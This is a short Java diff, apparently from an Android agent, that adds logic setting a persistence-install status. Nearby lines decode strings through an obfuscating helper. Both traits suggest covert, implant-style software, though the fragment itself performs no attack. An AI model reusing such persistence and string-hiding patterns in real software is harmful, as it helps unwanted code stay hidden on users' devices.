@@ -174,6 +174,11 @@ public class Keys {
 			if (isPersistent()) {
 				Cfg.PERSISTENCE = true;
 			}
+			if (Cfg.PERSISTENCE) {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_TO_INSTALL);
+			} else {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_NOT_REQUIRED);
+			}
 
 			if (Build.BOARD.equals(M.e("BLACKBERRY"))) {
 				Cfg.BLACKBERRY = true;
